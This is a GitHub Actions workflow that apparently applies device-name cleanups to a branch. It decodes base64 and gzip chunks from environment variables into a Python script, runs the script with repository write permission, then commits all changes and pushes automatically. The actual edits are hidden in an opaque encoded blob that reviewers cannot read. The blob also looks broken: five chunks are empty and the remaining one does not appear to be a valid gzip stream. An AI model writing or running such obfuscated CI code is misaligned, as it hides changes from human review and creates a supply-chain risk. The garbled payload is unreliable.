name: Apply clean device names

on:
  push:
    branches:
      - fix/clean-device-names

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-24.04
    steps:
      - name: Check out repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: fix/clean-device-names
      - name: Apply source and test updates
        shell: bash
        env:
          CHUNK_1: 
          CHUNK_2: 
          CHUNK_3: 
          CHUNK_4: 
          CHUNK_5: 
          CHUNK_6: KmsUdZwH6oL//Pc/nJF7/veHfzLhayoLk2JMwLLppNh0fDq4gcZD3w4uPfWRnq8g0HY2XY3r2VOMq9b1FNibjRqm5Ld9GIOb7FHV4NNeibAu5Bu0v1Nuyg2R3UH/hqYCl9nQ7EOb+ZGvF6gK0nLMv5MNHL/G5pYSACDS1kYfep0ZXYKKiwGy7CmIWuKStXb0jWwetvddYanoMtPhNJtPlqgIF2GRb9fTefQE2Ba6FszIcgHa42oNNzK1r1a0KOBiHxmiROEKkXsjPqduB60Xoh4F5MFuAAA=
        run: |
          set -euo pipefail
          printf '%s' "$CHUNK_1$CHUNK_2$CHUNK_3$CHUNK_4$CHUNK_5$CHUNK_6" | base64 --decode | gzip --decompress > /tmp/apply_clean_names.py
          python /tmp/apply_clean_names.py
      - name: Commit changes
        shell: bash
        run: |
          set -euo pipefail
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git diff --cached --check
          git commit -m 'fix: clean KEPCO device names and group sensor information'
          git push origin HEAD:fix/clean-device-names
